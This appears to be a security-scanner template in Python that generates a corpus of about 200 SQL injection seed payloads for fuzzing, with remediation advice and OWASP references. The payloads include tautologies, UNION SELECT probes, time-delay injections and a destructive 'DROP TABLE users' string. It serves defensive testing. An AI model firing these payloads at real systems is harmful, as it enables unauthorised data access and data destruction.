#!/usr/bin/env python3
# @id: ai-assisted-fuzzing-sqli-seed-corpus
# @name: AI-Assisted Fuzzing SQLi Seed Corpus
# @author: CERT-X-GEN Security Team
# @severity: info
# @description: Generates a deterministic SQL injection seed corpus inspired by AI-assisted fuzzing patterns
# @tags: ai, fuzzing, sqli, seed, recon
# @cwe: CWE-89
# @confidence: 80
# @references: https://book.hacktricks.xyz/ai/ai-assisted-fuzzing-and-vulnerability-discovery, https://owasp.org/www-community/attacks/SQL_Injection

import argparse
import json
import os
import sys
from typing import Dict, Any, List


class CertXGenTemplate:
    """Base class for CERT-X-GEN Python templates"""

    def __init__(self):
        self.id = "template-skeleton"
        self.name = "Python Template Skeleton"
        self.author = "Your Name"
        self.severity = "high"
        self.tags = ["skeleton", "example"]
        self.confidence = 90
        self.cwe = "CWE-XXX"
        self.target = None
        self.context: Dict[str, Any] = {}

    def execute(self, target: str, port: int = 80) -> List[Dict[str, Any]]:
        raise NotImplementedError

    def create_finding(
        self,
        title: str,
        description: str,
        evidence: Dict[str, Any],
        severity: str = None,
        remediation: str = None,
    ) -> Dict[str, Any]:
        return {
            "template_id": self.id,
            "severity": severity or self.severity,
            "confidence": self.confidence,
            "title": title,
            "description": description,
            "evidence": evidence,
            "cwe": self.cwe,
            "cvss_score": self.calculate_cvss_score(severity or self.severity),
            "remediation": remediation or self.get_remediation(),
            "references": self.get_references(),
        }

    def calculate_cvss_score(self, severity: str) -> float:
        scores = {
            "critical": 9.0,
            "high": 7.5,
            "medium": 5.0,
            "low": 3.0,
            "info": 0.0,
        }
        return scores.get(severity.lower(), 5.0)

    def get_remediation(self) -> str:
        return (
            "1. Use parameterized queries or prepared statements.\n"
            "2. Enforce strict input validation and allowlists.\n"
            "3. Add centralized logging for failed queries.\n"
            "4. Apply least-privilege to database accounts."
        )

    def get_references(self) -> List[str]:
        return [
            "https://book.hacktricks.xyz/ai/ai-assisted-fuzzing-and-vulnerability-discovery",
            "https://owasp.org/www-community/attacks/SQL_Injection",
        ]

    def parse_arguments(self) -> argparse.Namespace:
        parser = argparse.ArgumentParser(
            description=self.name,
            formatter_class=argparse.RawDescriptionHelpFormatter,
        )

        parser.add_argument("target", nargs="?", help="Target host or IP address")
        parser.add_argument("--target", dest="target_flag", help="Target host (alternative)")
        parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
        parser.add_argument("--json", action="store_true", help="Output findings as JSON")
        parser.add_argument("--verbose", action="store_true", help="Verbose output")

        return parser.parse_args()

    def run(self):
        args = self.parse_arguments()
        target = args.target or args.target_flag or os.environ.get("CERT_X_GEN_TARGET_HOST")
        if not target:
            print("Error: No target specified", file=sys.stderr)
            sys.exit(1)

        port = int(os.environ.get("CERT_X_GEN_TARGET_PORT", args.port))

        if "CERT_X_GEN_CONTEXT" in os.environ:
            try:
                self.context = json.loads(os.environ["CERT_X_GEN_CONTEXT"])
            except json.JSONDecodeError:
                self.context = {}

        findings = self.execute(target, port)

        if args.json or os.environ.get("CERT_X_GEN_MODE") == "engine":
            print(json.dumps(findings, indent=2))
        else:
            if findings:
                print(f"\n[+] Found {len(findings)} issue(s):\n")
                for finding in findings:
                    print(f"[{finding['severity'].upper()}] {finding['title']}")
                    print(f"    {finding['description']}")
                    if args.verbose:
                        print(f"    Evidence: {finding['evidence']}")
                    print()
            else:
                print("\n[-] No issues found")


class AiAssistedFuzzingSqlSeedCorpus(CertXGenTemplate):
    """Generate a deterministic SQLi seed corpus for fuzzing."""

    def __init__(self):
        super().__init__()
        self.id = "ai-assisted-fuzzing-sqli-seed-corpus"
        self.name = "AI-Assisted Fuzzing SQLi Seed Corpus"
        self.author = "CERT-X-GEN Security Team"
        self.severity = "info"
        self.tags = ["ai", "fuzzing", "sqli", "seed", "recon"]
        self.cwe = "CWE-89"
        self.confidence = 80

    def _build_seed_payloads(self) -> List[str]:
        base_payloads = [
            "OR 1=1",
            "OR '1'='1'",
            "OR \"1\"=\"1\"",
            "AND 1=1",
            "' OR 'a'='a'",
            "\" OR \"a\"=\"a\"",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1\"",
            "UNION SELECT NULL",
            "UNION SELECT NULL,NULL",
            "UNION SELECT NULL,NULL,NULL",
            "UNION ALL SELECT NULL",
            "UNION ALL SELECT 1,2,3",
            "ORDER BY 1",
            "ORDER BY 2",
            "ORDER BY 3",
            "0; DROP TABLE users;--",
            "SLEEP(5)",
            "pg_sleep(5)",
            "WAITFOR DELAY '0:0:5'",
            "BENCHMARK(1000000,MD5(1))",
            "OR 1=1--",
            "OR 1=1#",
            "OR 1=1/*",
            "OR 1=1;--",
            "OR 1=1;#",
            "OR 1=1;/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "0 UNION SELECT NULL",
            "0 UNION SELECT NULL,NULL",
            "0 UNION SELECT NULL,NULL,NULL",
        ]

        prefixes = ["", " ", "0", "1", "-1", "0)", "1)", "')", "\")"]
        suffixes = ["", " -- ", " #", " /*", " */", " /*test*/", " ;--", " ;#", " ;-- -"]

        unique_payloads = []
        seen = set()

        def add_payload(value: str) -> None:
            candidate = value.strip()
            if not candidate or len(candidate) > 256:
                return
            if candidate not in seen:
                seen.add(candidate)
                unique_payloads.append(candidate)

        for payload in base_payloads:
            add_payload(payload)

        for prefix in prefixes:
            for payload in base_payloads:
                for suffix in suffixes:
                    combined = f"{prefix}{payload}{suffix}".strip()
                    add_payload(combined)
                    if len(unique_payloads) >= 200:
                        return unique_payloads[:200]

        return unique_payloads[:200]

    def execute(self, target: str, port: int = 80) -> List[Dict[str, Any]]:
        payloads = self._build_seed_payloads()

        description = (
            f"Generated a deterministic SQLi seed corpus for {target}:{port} "
            "based on AI-assisted fuzzing patterns from HackTricks. "
            "Feed these seeds into a coverage-guided fuzzer to bootstrap syntax-valid inputs."
        )

        evidence = {
            "target": f"{target}:{port}",
            "seed_count": len(payloads),
            "sample_seeds": payloads[:20],
        }

        finding = self.create_finding(
            title="AI-Assisted SQLi Seed Corpus Generated",
            description=description,
            evidence=evidence,
            severity="info",
        )

        return [finding]


if __name__ == "__main__":
    template = AiAssistedFuzzingSqlSeedCorpus()
    template.run()
